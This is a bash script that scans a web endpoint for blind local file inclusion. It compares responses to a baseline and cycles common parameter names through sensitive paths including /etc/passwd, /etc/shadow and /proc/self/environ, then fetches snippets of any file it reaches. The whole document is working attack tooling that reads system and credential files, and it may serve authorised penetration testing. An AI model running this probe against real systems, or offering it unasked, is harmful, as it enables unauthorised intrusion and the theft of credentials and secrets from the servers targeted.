#!/bin/bash
# Blind LFI Response Differential Probe
# 用法: detect_blind_lfi.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:80}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
echo "=== Blind LFI Response Differential Probe ==="

COMMON_PARAMS="page file include path doc folder view content template image"

ENDPOINT_PATH_Q="${ENDPOINT#$BASE}"
ENDPOINT_PATH="${ENDPOINT_PATH_Q%%\?*}"
[ -z "$ENDPOINT_PATH" ] && ENDPOINT_PATH="/"

MOUNTS="$ENDPOINT_PATH /"
if [ "$ENDPOINT_PATH" != "/" ]; then
  DIR_PART=$(dirname "$ENDPOINT_PATH")
  [ "$DIR_PART" != "." ] && [ "$DIR_PART" != "/" ] && MOUNTS="$ENDPOINT_PATH $DIR_PART/ /"
fi

build_url() {
  local mount="$1"
  local param="$2"
  local payload="$3"
  local url
  if [ "$mount" = "/" ]; then
    url="$BASE/?$param=$payload"
  else
    url="$BASE${mount}?$param=$payload"
  fi
  echo "$url"
}

# Step 1: 建立基准响应
echo "--- [Step 1] 建立基准（不存在文件） ---"
declare -A BASELINE
NONEXIST="nonexistent_file_lfi_test_$$.txt"
for mount in $MOUNTS; do
  for param in $COMMON_PARAMS; do
    URL=$(build_url "$mount" "$param" "$NONEXIST")
    result=$(curl -s -o /dev/null -w "%{http_code} %{size_download} %{time_total}" "$URL" --max-time 5 2>/dev/null)
    http_code=$(echo "$result" | cut -d' ' -f1)
    body_size=$(echo "$result" | cut -d' ' -f2)
    BASELINE["$param"]="$http_code $body_size"
    echo "[BASELINE] param=$param code=$http_code size=$body_size URL=$URL"
  done
  break  # 只用一个 mount 建立基准（节省时间）
done
echo ""

# Step 2: 探测目标文件，对比差异
echo "--- [Step 2] 差异对比探测 ---"
PROBE_FILES="/etc/passwd /etc/hosts /etc/hostname /proc/self/environ /proc/version /etc/shadow /var/log/auth.log"
HIT_COUNT=0
for mount in $MOUNTS; do
  for param in $COMMON_PARAMS; do
    base="${BASELINE[$param]}"
    [ -z "$base" ] && base="200 0"
    base_code=$(echo "$base" | cut -d' ' -f1)
    base_size=$(echo "$base" | cut -d' ' -f2)
    for target in $PROBE_FILES; do
      clean_target=$(echo "$target" | sed 's|^/||')
      URL=$(build_url "$mount" "$param" "$clean_target")
      result=$(curl -s -o /dev/null -w "%{http_code} %{size_download}" "$URL" --max-time 5 2>/dev/null)
      http_code=$(echo "$result" | cut -d' ' -f1)
      body_size=$(echo "$result" | cut -d' ' -f2)
      [ -z "$body_size" ] && body_size=0

      # 检测条件：状态码变化 或 响应大小显著不同（>50字节差异）
      code_changed=0
      size_diff=0
      [ "$http_code" != "$base_code" ] && code_changed=1
      if [ "$body_size" -gt 0 ] && [ "$base_size" -gt 0 ]; then
        size_diff=$((body_size - base_size))
        [ $size_diff -lt 0 ] && size_diff=$((-size_diff))
      fi

      if [ "$code_changed" -eq 1 ] || [ "$size_diff" -gt 50 ]; then
        HIT_COUNT=$((HIT_COUNT + 1))
        echo "[BLIND-HIT #$HIT_COUNT] param=$param target=$target"
        echo "    URL: $URL"
        echo "    baseline: code=$base_code size=${base_size}B  ->  probe: code=$http_code size=${body_size}B  (diff=${size_diff}B)"
        content=$(curl -s "$URL" --max-time 5 2>/dev/null | head -c 200)
        echo "    content_snippet: ${content:0:120}"
        echo "---"
      else
        echo "[BLIND-MISS] param=$param target=$target code=$http_code size=${body_size}B (baseline: $base_code/${base_size}B)"
      fi
    done
  done
done

echo ""
if [ "$HIT_COUNT" -gt 0 ]; then
  echo "BLIND_LFI_HIT:$HIT_COUNT"
  echo "LFI_FOUND:page:0:blind_differential"
  echo "{\"event\":\"lfi_param_found\",\"payload\":{\"param\":\"page\",\"depth\":0,\"style\":\"blind\",\"blind\":true,\"confirmed\":true,\"blind_hit_count\":$HIT_COUNT}}"
else
  echo "BLIND_LFI_NOT_FOUND"
fi
